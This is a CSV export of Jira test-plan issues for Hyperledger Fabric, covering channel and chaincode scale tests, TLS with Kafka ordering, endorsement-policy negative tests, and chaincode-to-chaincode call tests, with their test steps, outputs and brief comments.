Summary,Issue key,Issue id,Parent id,Issue Type,Status,Project key,Project name,Project type,Project lead,Project description,Project url,Priority,Resolution,Assignee,Reporter,Creator,Created,Updated,Last Viewed,Resolved,Affects Version/s,Affects Version/s,Affects Version/s,Fix Version/s,Fix Version/s,Component/s,Component/s,Component/s,Component/s,Component/s,Due Date,Votes,Labels,Labels,Labels,Labels,Labels,Labels,Description,Environment,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Log Work,Log Work,Original Estimate,Remaining Estimate,Time Spent,Work Ratio,Σ Original Estimate,Σ Remaining Estimate,Σ Time Spent,Security Level,Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Inward issue link (Cloners),Inward issue link (Cloners),Inward issue link (Cloners),Outward issue link (Cloners),Inward issue link (Duplicate),Inward issue link (Duplicate),Inward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Custom field (Business Value),Custom field (Commit Levels),Custom field (Current Status),Custom field (Design),Custom field (Design Status),Custom field (Documentation Impact),Custom field (Documentation Status),Custom field (Epic Color),Custom field (Epic Link),Custom field (Epic Name),Custom field (Epic Status),Custom field (Executed),Custom field (Found in Commit),Custom field (Function Test Status),Custom field (Must Fix),Custom field (Original story points),Custom field (Parent Link),Custom field (Rank),Custom field (Release Note),Custom field (Release Note Required),Custom field (Root Cause Analysis),Custom field (SDK Impact),Custom field (Sample/Tutorial),Sprint,Sprint,Sprint,Sprint,Custom field (Steps to Reproduce),Custom field (Story Points),Custom field (System Test Impact),Custom field (Target end),Custom field (Target start),Custom field (Team),Custom field (Team),Custom field (Test Plan),Custom field (Test Result),Custom field (Test Result Details),Custom field (Test Type),Custom field (Triaged),Custom field (Usage),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Workaround),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitCommitsReferenced),Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment
e2e_perf with 50 channels 10 chaincodes,FAB-4711,17993,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:13 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf with 50 channels 10 chaincodes

*Component*: Ledger/Channel
 *Description*: modify e2e_cli sample scripts to create 50 channels and install/instantiate 10 chaincodes and send transactions on to those channels.

ensure all the transaction sent to all the channels (using all chaincodes) are successful

*Artifact Locations:* NA
 *Network Topology*:  e2e_cli based network topology 
 *Client Driver*:  _e2e_cli sample_
 *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2q7:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e_perf with 100 channels 10 chaincodes,FAB-4712,17994,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,Clayton Sims,Clayton Sims,15/Jun/17 5:13 AM,30/Jul/19 11:42 AM,28/Oct/23 3:00 AM,30/Jul/19 11:42 AM,,,,v1.1.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf with 100 channels 10 chaincodes

*Component*: Ledger/Channel
 *Description*:  modify e2e_cli sample scripts to create 100 channels and install/instantiate 10 chaincodes and send transactions on to those channels.

ensure all the transaction sent to all the channels (using all chaincodes) are successful

*Artifact Locations:* NA
 *Network Topology*:  e2e_cli based network topology 
 *Client Driver*:  _e2e_cli sample_
 *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,mastersingh24,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2qf:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/May/18 3:48 AM;scottz;For v1.2 and afterwards, rerun this testcase as is, or else just make sure at least one PTE testcase uses 100 or more channels, and another uses minimum 10 chaincodes.;;;","30/Jul/19 11:42 AM;mastersingh24;Open 1 year or more with no activity ... time to cleanup;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e_cli with TLS enabled with Kafka based ordereing service,FAB-4713,17995,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:13 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: {color:#000000}e2e_cli with TLS with Kafka based ordereing service{color}

*Component*: Ledger/Channel
  *Description*:  modify e2e_cli sample scripts to enabled/disabled TLS configurations with kafka orderering service

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology  + kafka orderering service (+ zookeeper)
  *Client Driver*:  _e2e_cli sample_ 
  *Output:*  Test  passed with valid certs and failed with invalid certs.

output when test passed:
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}
 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2qn:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e with TLS ,FAB-4714,17996,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:17 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e scenario using behave, with TLS enabled

*Component*: integration
*Description*:  modify e2e_cli sample scripts: install, instantiate, invoke, query, using example02 and minimum standard network

*Artifact Locations:* NA
*Network Topology*:  e2e_cli based network topology 
*Client Driver*:  _behave_
*Output:*  Test passed",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2qv:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"negative testing - Reject endorsements that contain conflicting actions - propose two TX using example02 within same block; one should be rejected by VSCC",FAB-4715,17997,16637,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:17 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name* : negative testing - Reject endorsements that contain conflicting actions - propose two TX using example02 within same block; one should be rejected by VSCC

*Component*: endorser/committer/ledger
  *Description*: Verify if the endorser rejects the conflicting transatcions (using example02 chaincode)
 * Use e2e_cli or balance-transfer sample from nodesdk and launch the default network
 * Send two transactions at the same time and see if the transactions are processed and committed to the ledger by querying the chaincode

*Artifact Locations:* NA
  *Network Topology*:  same as e2e_cli/node-sdk balance-transfer based network topology 
  *Client Driver*:  _e2e_cli sample_/  node sample balance-transfer
  *Output:*  

Tranactions must be rejected by the Validating Systen chaincode",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2r3:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"negative testing - TX fails due to endorsement policy ""AND"", when send TX Proposal to only one peer for endorsement",FAB-4716,17998,16637,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name* : Negative testing - TX fails due to endorsement policy ""AND"", when send TX Proposal to only one peer for endorsement

*Component*: endorser/committer/ledger
  *Description*: Verify if the transaction fails when endorsement policy is AND but send the proposal to only one endorser.

Change the instantiated chaincode pilicy to AND instead of OR in the e2e_cli sample scripts

*Artifact Locations:* NA
  *Network Topology*:  same as e2e_cli  based network topology 
  *Client Driver*:  _e2e_cli sample_ 
  *Output:* 

Tranactions are rejected 
  ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2rb:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode-to-chaincode testing passing in channel name as a third argument to chaincode_ex05 ,FAB-4717,17999,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,2020Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Aug/17 11:50 PM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Component: endorser

Description:  Verify invoke and query transactions for chaincode-to-chaincode call with the channel name as the third argument

Artifact Locations: github.com/hyperledger/fabric-test/feature/chaincodes.feature

Client Driver:

              Behave

              Build fabric docker images

              Run behaveinstall.sh from from fabric/scripts

             {{from hyperledger/fabric-test folder}} Run - {{git submodule update --init --recursive }}

            

Input: behave chaincodes.feature (from hyperledger/fabric-test/feature)

 ",,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2rj:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 5:56 AM;Nishi;submitted patch set [https://gerrit.hyperledger.org/r/#/c/12493/];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode-to-chaincode testing passing an empty string for channel_name when cc_05 and cc_02 are on the same channel,FAB-4718,18000,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,13/Sep/17 11:02 PM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: e2e_test_example05.sh

Component: endorser

Description:  Verify invoke and query transactions for chaincode-to-chaincode call on the same channel by passing empty string """" for the channel name argument

Artifact Locations: fabric/test/regression/daily/chaincodetests

Network Topology: e2e_cli

Client Driver: python script

                      dependency: sudo pip install -U pytest

Input: ./runChaincode.sh (from fabric/test/regression/daily/chaincodetests/envsetup)

Output: [testYourChaincode.py::ChaincodeAPI::test_FAB3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel|http://testyourchaincode.pychaincodeapitest_fab3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel/] PASSED",,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2rr:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 5:57 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode-to-chaicode testing passing when cc_05 and cc_02 are on different channels,FAB-4719,18001,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:19 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,13/Sep/17 11:03 PM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: e2e_test_example05.sh

Component: endorser

Description:  Verify invoke and query transactions for chaincode-to-chaincode call on different channels by passing channel name as ""channel_name where cc_02 is installed"" for the third argument

Artifact Locations: fabric/test/regression/daily/chaincodetests

Network Topology: e2e_cli

 Client Driver: python script

                      dependency: sudo pip install -U pytest

Input: ./runChaincode.sh (from fabric/test/regression/daily/chaincodetests/envsetup)

Output: [testYourChaincode.py::ChaincodeAPI::test_FAB3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel|http://testyourchaincode.pychaincodeapitest_fab3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel/] PASSED",,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2rz:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 5:57 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test chaincode calling chaincode -ve test case passing an incorrect or non-existing channnel name in query fabric/examples/chaincode_example05,FAB-4720,18002,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:20 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Sep/17 12:43 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2s7:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,true,"17/Aug/17 5:58 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"chaincode_to_chaincode -ve Test:  When given incorrect channel name, when cc_02 and cc_05 are on different channels",FAB-4721,18003,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:20 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Sep/17 12:43 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: e2e_test_example05.sh

Component: endorser

Description: Verify if query on chaincode fails when incorrect chaincode install name is passed.

Artifact Locations: fabric/test/regression/daily/chaincodetests

Network Topology: e2e_cli

Client Driver: python script

                     dependency: sudo pip install -U pytest

Input: ./runChaincode.sh (from fabric/test/regression/daily/chaincodetests/envsetup)

Output: [testYourChaincode.py::ChaincodeAPI::test_FAB3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel|http://testyourchaincode.pychaincodeapitest_fab3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel/]

FAILED",,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2sf:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"21/Jul/17 1:41 AM;Nishi;Duplicate of FAB-4720.

Whether one gives incorrect channel name or non-existing channel name fabric responds with a message something like 
""Error: Error endorsing query: rpc error: code = Unknown desc = Error executing chaincode: Transaction returned with failure: Failed to get policy manager for channel [test] - <nil>""


;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
